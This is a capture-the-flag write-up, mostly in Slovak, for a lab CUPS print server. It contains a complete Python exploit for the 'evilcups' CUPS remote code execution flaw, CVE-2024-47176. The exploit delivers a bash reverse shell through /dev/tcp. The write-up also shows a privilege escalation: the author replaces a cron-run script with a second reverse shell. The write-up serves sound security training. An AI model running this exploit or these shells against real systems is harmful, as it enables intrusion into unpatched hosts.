# Zadanie

Hi, emergency troubleshooter,

we've received a notification from the national CSIRT that the print server `ipp.powergrid.tcc` may contain a vulnerability. Verify this report and determine whether the vulnerability is present and how severe it is.

Stay grounded!

`NOTE: This challenge will restart every whole hour to ensure proper functionality.`

`NOTE: If you have played this challenge before 2025-10-06 23:08:00 CEST, start from scratch again, please. Some issues have been fixed.`

## Riešenie

Súdiac podľa subdomény ipp pôjde zrejme o CUPS (mám s ním vlastné skúsenosti) bežiaci na porte 631, tak mrknem na otvorené porty 

```
PORT    STATE SERVICE
631/tcp open  ipp
```

Áno a beží tam CUPS verzia 2.4.7 a po troche googlenia som našiel exploit známy ako evilcups (CVE-2024-47176) a idem ho vyskúšať. Budem však potrebovať vedieť svoju vpn ip, tú mam aktuálne 10.200.0.11, budem chcieť reverse shell, tak si pripravím listener, obľúbil som pwncat alebo penelope, teraz použijem penelope a budem počúvať na porte 9010 `python penelope.py -p 9010`.

```python
#!/usr/bin/env python3
# Based off of EvilSocket's Exploit Script
# Few changes to make it more relaible

import socket
import threading
import time
import sys

from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest

class ServerContext:
    def __init__(self, server):
        self.server = server
        self.server_thread = None

    def __enter__(self):
        print(f'IPP Server Listening on {server.server_address}')
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def __exit__(self, exc_type, exc_value, traceback):
        print('Shutting down the server...')
        self.server.shutdown()
        self.server_thread.join()

def handle_signal(signum, frame):
    raise KeyboardInterrupt()

class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'Main Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Main Printer Info'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP 0.00'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # (required by cups)
                    OperationEnum.validate_job,  # (required by cups)
                    OperationEnum.cancel_job,  # (required by cups)
                    OperationEnum.get_job_attributes,  # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],

        }
        attr.update(super().minimal_attributes())
        return attr

    def operation_printer_list_response(self, req, _psfile):
        print("\ntarget connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes)


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print(f"Sending udp packet to {ip}:{port}...")
    printer_type = 2
    printer_state = '3'
    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
    printer_location = '"HackingPlace"'
    printer_info = '"dy_hacked"'
    printer_model = '"dy LaserJet HackMe"'
    packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet.encode('utf-8'), (ip, port))

def run_server(server):
    with ServerContext(server):
        try:
            while True:
                time.sleep(.5)
        except KeyboardInterrupt:
            pass

    server.shutdown()


if __name__ == "__main__":

    SERVER_HOST = "10.200.0.11"
    SERVER_PORT = 12345

    command = 'bash -c "bash -i >& /dev/tcp/10.200.0.11/9010 0>&1"'

    server = IPPServer((SERVER_HOST, SERVER_PORT),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    TARGET_HOST = "ipp.powergrid.tcc"
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("Please wait this normally takes 30 seconds...")

    seconds = 0
    while True:
        print(f"\r{seconds} elapsed", end="", flush=True)
        time.sleep(1)
        seconds += 1
```

Skript spustím, na stránke sa zjaví nová tlačiareň, ktorú tam vsunul skript, dám tlačiť skúšobnú stránku a mal by sa spustiť príkaz, ktorý vytvorí reverse shell session na mojej penelope. Session sa mi vytvorila a som ako používateľ lp.

```shell
lp@ea3246f8dec9:/$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```

Prehľadal som všetky env premenné príkazom `set`, aj som dal prehľadať či sa niekde nenachádza súbor, čo obsahuje `FLAG{` prípadne base64 variantu `RkxBR` príkazom `grep -R -a -l -E 'RkxBR|FLAG\{' / 2>/dev/null`, ale nenašlo mi vlajku vôbec, takže treba hľadať ďalej.

Penelope ponúka celkom solídne skripty, tak si ich nahrám do nejakej zapisovateľnej zložky, napríklad `/tmp`. Ale rovno tam vidím zapísaný nejaký súbor `stats.txt` používateľom cups_admin, do ktorého home sa nedostanem, možno ma vyššie práva. Po nahraní skriptov som sa jeden pokúšal spustiť, ale vyhodilo mi chybu, že súbory neexistujú a pri vylistovaní súborov, tam skutočne neboli a súbor stats.txt mal inú časovú pečiatku. To zaváňa cron taskom.

```shell
lp@ea3246f8dec9:/tmp$ crontab -l
no crontab for lp
```

Vo `/var/log/cron.log` nie je nič, okrem `=== Script Output ===`, ale zrejme beží nejaký skript, tak som skúsil prehľadať filesystem na tento výraz, ale nenašlo nič. Pozriem cron zložky v /etc.

Hmm

```shell
lp@ea3246f8dec9:/etc/cron.d$ cat statistics-job
* * * * * cups_admin PATH=/opt/scripts:/usr/bin:/bin /usr/bin/python3 /opt/secure-scripts/statistics.py -n /opt/scripts/print_count.sh > /var/log/cron.log 2>&1
```

Je tam skript, ku ktorému sa nedostanem, ale má argument a zrejme volá iný skript, ku ktorému sa ale dostanem.

```shell
lp@ea3246f8dec9:/opt$ ls -la
total 20
drwxr-xr-x 1 root root     4096 Oct 21 04:01 .
drwxr-xr-x 1 root root     4096 Oct 21 16:00 ..
drwxr-xrwx 1 root cronexec 4096 Oct 21 16:25 scripts
drwxr-x--- 1 root cronexec 4096 Oct 21 16:25 secure-scripts
lp@ea3246f8dec9:/opt$ cd secure-scripts/
bash: cd: secure-scripts/: Permission denied
lp@ea3246f8dec9:/opt$ cd scripts/
lp@ea3246f8dec9:/opt/scripts$ ls -la
total 16
drwxr-xrwx 1 root cronexec 4096 Oct 21 16:25 .
drwxr-xr-x 1 root root     4096 Oct 21 04:01 ..
-rwxr-xr-- 1 root cronexec  343 Oct 21 16:25 print_count.sh
lp@ea3246f8dec9:/opt/scripts$ cat print_count.sh
#!/bin/bash

log="/var/log/cups/access_log"
output="/tmp/stats.txt"

grep 'POST /printers/.*HTTP/1\.1" 200' "$log" | awk '{ print $4, $7 }' | while read -r datetime path; do
    date=$(echo "$datetime" | cut -d: -f1 | tr -d '[')
    printer=$(echo "$path" | cut -d'/' -f3)
    echo "$date $printer"
done | sort | uniq -c | sort -nr > "$output"l
```

Pri pokuse o modifikovanie skriptu som dostal hlášku, že nemôžem

```shell
lp@ea3246f8dec9:/opt/scripts$ echo > print_count.sh
bash: print_count.sh: Permission denied
```

Ale podľa permissions `drwxr-xrwx 1 root cronexec 4096 Oct 21 16:25 scripts` priečinka `/opt/scripts` môžem súbor zmazať a vytvoriť svoj s rovnakým názvom. Skúsim tam nahrať ďalší reverse shell príkaz a skúsim počúvať o port vyššie `9011`.

Vytvoril som si súbor `print_count.sh` s obsahom

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.200.0.11/9011 0>&1"
```

a cron ho do minúty spustil a mám shell session ako používateľ cuprs_admin.

```shell
cups_admin@ea3246f8dec9:~$ ls -la
total 20
drwxr-xr-x 2 cups_admin cups_admin 4096 Oct 21 04:01 .
drwxr-xr-x 1 root       root       4096 Oct 21 04:01 ..
-rw-r--r-- 1 cups_admin cups_admin  220 Jun  6 14:38 .bash_logout
-rw-r--r-- 1 cups_admin cups_admin 3526 Jun  6 14:38 .bashrc
-rw-r--r-- 1 cups_admin cups_admin  807 Jun  6 14:38 .profile
```

skúsil som `sudo -l`, ktoré som tu predtým neopísal, ale ako lp používateľovi nešlo a pýtalo heslo, ale tu išlo a zobrazilo

```shell
cups_admin@ea3246f8dec9:~$ sudo -l
Matching Defaults entries for cups_admin on ea3246f8dec9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cups_admin may run the following commands on ea3246f8dec9:
    (ALL) NOPASSWD: /bin/cat /root/TODO.txt
```

ako používateľ cups_admin mám možnosť zadať jeden príkaz pomocou sudo bez nutnosti zadania root hesla a to `/bin/cat /root/TODO.txt`, takže zadám `sudo /bin/cat /root/TODO.txt`

```shell
cups_admin@ea3246f8dec9:~$ sudo /bin/cat /root/TODO.txt
FLAG{HqW1-cHIN-6S8U-w5uQ}
```

Hotovo!

## Vlajka

    FLAG{HqW1-cHIN-6S8U-w5uQ}
